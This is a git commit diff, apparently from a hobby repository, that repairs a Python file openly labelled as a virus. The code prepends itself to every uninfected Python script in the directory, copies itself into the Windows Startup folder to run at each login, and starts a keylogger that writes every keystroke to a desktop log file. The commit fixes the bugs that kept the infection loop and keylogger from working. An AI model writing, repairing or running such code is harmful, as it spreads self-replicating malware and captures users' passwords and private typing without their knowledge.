61ad5b0c45249f43ab6b28f3f935c28dc5a8a051
null <68474200+nullsleeps@users.noreply.github.com>
2024-11-02 09:26:52 -0400

    Update main.py

--- main.py
+++ main.py
@@ -1,17 +1,22 @@
-#Virus Beggining
+# Virus Beginning
 
-import sys, glob
+import sys
+import glob
+import os
+import logging
+from shutil import copyfile
+from pynput.keyboard import Listener
 
 code = []
 with open(sys.argv[0], 'r') as f:
     lines = f.readlines()
 virus_area = False
 for line in lines:
-    if line == '#Virus Beggining\n':
+    if line == '# Virus Beginning\n':
         virus_area = True
     if virus_area:
         code.append(line)
-    if line == '#Virus End\n':
+    if line == '# Virus End\n':
         break
 
 python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
@@ -22,35 +27,31 @@ for script in python_scripts:
 
     infected = False
     for line in script_code:
-        if line == '#Virus Beggining\n':
+        if line == '# Virus Beginning\n':
             infected = True
             break
-if not infected:
-    final_code = []
-    final_code.extend(code)
-    final_code.extend('\n')
-    final_code.extend(script_code)
 
-    with open(script, 'w') as f:
-        f.writelines(final_code)
+    if not infected:
+        final_code = []
+        final_code.extend(code)
+        final_code.append('\n') 
+        final_code.extend(script_code)
 
-#payload
-from pynput.keyboard import Listener
+        with open(script, 'w') as f:
+            f.writelines(final_code)
 
-import os
-import logging
-from shutil import copyfile
 
 username = os.getlogin()
 logging_directory = f"/Users/{username}/Desktop"
 
-copyfile('main.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/main.py')
 
-logging.basicConfig(filename=f"{logging_directory})/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
+copyfile(sys.argv[0], f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/main.py')
+
+
+logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 def key_handler(key):
     logging.info(key)
 
 with Listener(on_press=key_handler) as listener:
-    listener.join
-#Virus End
+    listener.join() 
